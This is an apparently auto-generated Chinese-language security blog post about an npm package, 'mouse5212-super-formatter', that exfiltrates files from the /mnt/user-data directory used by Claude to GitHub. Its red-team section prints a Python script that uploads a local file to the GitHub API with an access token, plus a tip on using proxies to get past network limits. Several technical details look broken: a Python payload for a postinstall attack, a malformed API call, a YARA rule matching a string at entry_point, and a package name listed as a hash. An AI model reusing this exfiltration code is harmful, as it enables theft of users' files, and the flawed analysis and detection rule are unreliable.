---
layout: post
title:  "Malicious npm Package Stole Files From Claude AI User Directory via GitHub"
date:   2026-05-27 20:05:56 +0000
categories: [security]
severity: high
---

# 🔥 解析 npm 上的 Malware-Slop 資料竊取攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: Info Leak
> * **關鍵技術**: `npm`, `GitHub`, `信息竊取`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Malware-Slop 攻擊利用了 npm 上的一個惡意套件 (`mouse5212-super-formatter`)，該套件設計用於從 `/mnt/user-data` 目錄中上傳檔案，該目錄由 Anthropic 的 Claude 人工智慧工具用於處理上傳和輸出。
* **攻擊流程圖解**:
  1. 安裝惡意套件
  2. 執行 `postinstall` 腳本
  3. 驗證 GitHub 存取權杖
  4. 上傳檔案到 GitHub
* **受影響元件**: npm 上的 `mouse5212-super-formatter` 套件，GitHub 存取權杖

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要 npm 和 GitHub 存取權杖
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import requests
    
    # 上傳檔案到 GitHub
    def upload_file(file_path, github_token):
        headers = {'Authorization': f'token {github_token}'}
        files = {'file': open(file_path, 'rb')}
        response = requests.post('https://api.github.com/repos/username/repo/contents/path', headers=headers, files=files)
        return response.json()
    
    # 執行上傳檔案
    github_token = 'your_github_token'
    file_path = '/mnt/user-data/file.txt'
    upload_file(file_path, github_token)
    
    ```
* **繞過技術**: 可以使用代理伺服器或 VPN 來繞過網路限制

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `mouse5212-super-formatter` |  | `github.com` | `/mnt/user-data/` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Malware_Slop {
      meta:
        description = "Malware-Slop 惡意套件"
        author = "Your Name"
      strings:
        $a = "mouse5212-super-formatter"
      condition:
        $a at entry_point
    }
    
    ```
* **緩解措施**: 刪除惡意套件，更新 GitHub 存取權杖

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **npm (Node Package Manager)**: 一個 Node.js 的套件管理工具，允許開發者輕鬆地安裝和管理套件。
* **GitHub**: 一個網路上的版本控制平台，允許開發者存儲和管理代碼。
* **信息竊取 (Info Leak)**: 一種攻擊方式，攻擊者竊取敏感信息，例如使用者名稱、密碼等。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/05/malicious-npm-package-stole-files-from.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1005/)


